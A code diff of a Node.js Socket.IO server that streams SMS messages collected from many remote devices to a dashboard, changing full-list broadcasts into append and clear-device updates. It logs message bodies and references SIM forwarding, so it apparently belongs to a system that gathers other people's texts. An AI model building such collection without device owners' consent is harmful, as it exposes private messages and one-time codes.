@@ -31,7 +31,7 @@ app.set("io", io);
 const deviceSockets = new Map();
 let lastDevicesList = [];
 
-// ⭐ NEW: SMS LIVE cache (All SMS list)
+// ⭐ NEW: SMS LIVE cache (All SMS list) → sirf snapshot ke liye
 let lastSmsAllList = [];
 
 /* ---------------- ID Cleaner ---------------- */
@@ -155,28 +155,22 @@ function buildDeviceSmsListFromSnap(uid, rawMessages) {
   return list;
 }
 
-// Push ALL SMS list to all clients
+// ⭐ Ab ye sirf snapshot update karega (NO EMIT)
+//    initial mein call hoga, ya maintenance ke liye
 async function refreshSmsAllLive(reason = "") {
   try {
     const finalList = await buildAllSmsList();
     lastSmsAllList = finalList;
 
-    io.emit("smsLogsAllLive", {
-      success: true,
-      reason,
-      count: finalList.length,
-      data: finalList,
-    });
-
     console.log(
-      `📨 smsLogsAllLive pushed (${reason}) → ${finalList.length} messages`
+      `📨 smsLogsAll snapshot refreshed (${reason}) → ${finalList.length} messages`
     );
   } catch (err) {
     console.error("❌ refreshSmsAllLive ERROR:", err.message);
   }
 }
 
-// Push SMS of a single device to all clients
+// Push SMS of a single device to all clients (device-details page)
 function emitSmsDeviceLive(uid, messages, event = "update") {
   const list = buildDeviceSmsListFromSnap(uid, messages);
 
@@ -208,9 +202,11 @@ io.on("connection", (socket) => {
     data: lastDevicesList,
   });
 
-  // ⭐ Send initial SMS ALL LIST (for messages.html page)
+  // ⭐ Initial ALL-SMS SNAPSHOT for messages.html
+  //    mode: "initial" + full list
   socket.emit("smsLogsAllLive", {
     success: true,
+    mode: "initial",
     count: lastSmsAllList.length,
     data: lastSmsAllList,
   });
@@ -676,7 +672,7 @@ simForwardRef.on("child_removed", (snap) =>
 );
 
 /* ======================================================
-   ⭐ SMS LIVE — ONLY NEW / CHANGED SMS LOG  (FIXED)
+   ⭐ SMS LIVE — ONLY NEW / CHANGED SMS LOG (LATEST SINGLE)
 ====================================================== */
 
 const smsNotificationsRef = rtdb.ref(SMS_NODE);
@@ -684,7 +680,7 @@ const smsNotificationsRef = rtdb.ref(SMS_NODE);
 // Simple cache: last latest SMS ID per device
 const smsCache = {};
 
-// PURE helper: build sorted list & latest SMS
+// PURE helper: build sorted list
 function buildSortedSmsList(uid, messages) {
   const list = Object.entries(messages || {}).map(([id, obj]) => ({
     id,
@@ -709,6 +705,7 @@ async function handleSmsNotificationsBranch(snap, event = "update") {
 
   smsCache[uid] = { latestId: newLatestId };
 
+  // ⭐ Ye part sirf NEW / CHANGED latest SMS ke liye
   if (latest && newLatestId && newLatestId !== prevLatestId) {
     console.log("\n\n======== 📩 NEW / CHANGED SMS ========");
     console.log(`📌 DEVICE: ${uid}`);
@@ -720,20 +717,24 @@ async function handleSmsNotificationsBranch(snap, event = "update") {
     console.log(`✉️ Message: ${latest.body}`);
     console.log("=======================================\n\n");
 
-    // ⭐ Single latest NEW/UPDATED SMS to frontend (FAST)
-    io.emit("smsLogsNew", {
+    // ⭐ FRONTEND ke liye single latest SMS (APPEND MODE)
+    io.emit("smsLogsAllLive", {
       success: true,
+      mode: "append",
       uniqueid: uid,
       msgId: latest.id,
       data: latest,
     });
+
+    // Snapshot list ko bhi update kar do (taaki naye client ko recent mil jaaye)
+    lastSmsAllList = [
+      latest,
+      ...lastSmsAllList.filter((sms) => sms.id !== latest.id),
+    ];
   }
 
   // Per-device full list (for device-details page)
   emitSmsDeviceLive(uid, messages, event);
-
-  // Full refresh for All Messages page (messages.html)
-  await refreshSmsAllLive(`sms_${event}:${uid}`);
 }
 
 smsNotificationsRef.on("child_added", (snap) =>
@@ -751,8 +752,17 @@ smsNotificationsRef.on("child_removed", async (snap) => {
 
   smsCache[uid] = { latestId: null };
 
+  // Snapshot list se bhi hata do
+  lastSmsAllList = lastSmsAllList.filter((sms) => sms.uniqueid !== uid);
+
   emitSmsDeviceLive(uid, {}, "removed");
-  await refreshSmsAllLive(`sms_removed:${uid}`);
+
+  // Frontend ko bata do ki iss device ka sab clear
+  io.emit("smsLogsAllLive", {
+    success: true,
+    mode: "clearDevice",
+    uniqueid: uid,
+  });
 });
 
 /* ======================================================
@@ -787,8 +797,9 @@ app.get("/api/devices", async (req, res) => {
   }
 });
 
-refreshDevicesLive("initial");
-refreshSmsAllLive("initial");
+// ⭐ initial snapshots
+await refreshDevicesLive("initial");
+await refreshSmsAllLive("initial");
 
 app.use(adminRoutes);
 app.use("/api", checkRoutes);
